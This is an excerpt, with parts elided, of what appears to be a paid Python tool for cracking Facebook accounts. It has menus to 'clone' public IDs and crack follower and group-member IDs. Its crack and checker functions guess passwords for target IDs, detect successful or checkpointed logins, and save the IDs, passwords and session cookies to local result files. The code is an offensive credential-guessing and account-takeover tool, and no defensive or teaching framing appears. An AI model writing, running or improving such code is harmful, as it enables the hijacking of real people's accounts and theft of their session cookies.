...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mWELL COME TO RIAZ TOOL🖤')
...
def banner():
	...
	print("""%s
       ...
       \033[1;37m  
\033[1;32m(!)================================================================
\033[1;32m(√) \033[1;33mCREATED BY   :  \033[1;33m TOUFIQ AHMED
\033[1;32m(√) \033[1;34mON FACEBOK   :  \033[1;34m Md.Minhajul Abedin 
\033[1;32m(√) \033[1;35mON GITHUB    :  \033[1;35m TOUFIQ-AHMED
\033[1;32m(√) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS PAID
\033[1;32m(√) \033[1;36mTOOL VIRSION :  \033[1;36m1.0.0

\033[1;32m(!)=================================================================
"""%(P))

def linex():	print("%s(!)═══════════════════════════════════════%s"%(P,P))
def login():
		banner()
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[bold green] 😍1. CLONE PUBLICK ID (BEST)\n 😍2. CRACK FOLLOWER ID\n 😍3. CRACK FROM GROUP MEMBERS\n 😍4. FILE CLONING\n 😍5. CHEK RESULTS\n 😍0. EXIT [bold green]')) 
...
def passwrd():
	...
	print(f'                    {m}R {k}I {h}I {u}A {b}Z {u}  ★  {b}K {u}H {h} A {k} N {m} 🖤{b}')
	print('')
	print(f'👉RESULTS {h}TOUFIQ-OK{u} CHEK : {h}OK/%s {b}'%(okc))
	print(f'👉RESULTS {k}TOUFIQ-CP{h} CHEK : {k}CP/%s {b}'%(cpc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}TOUFIQ-CRACKING-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{RIAZ-ok}{P}]—{P}[{k}{RIAZ-cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     🙃💔SORRY BRO DONTD SAD 🙃w8 for ok[red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('TOUFIQ-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				cetak(nel('[green]  Congratulations Bro 🖤🥀now enjoy🥀  [green]')) 
				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
				open('TOUFIQ-OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      Congratulations Bro 🖤🥀now enjoy🥀[purple]')) 
				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
				open('TOUFIQ-OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/TOUFIQ/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/TOUFIQ/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='TOUFIQ🙃 OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RIAZ-KHAN🙃 OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='TOUFIQ-CP'))
					open('/sdcard/TOUFIQ/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> TOUFIQ-CP💔       %s'%(b,idf,pw,x))
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> TOUFIQ-CP💔       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s++++ %s|%s ----> TOUFIQ-OK🙃       %s'%(h,id,pw,x))
			else:
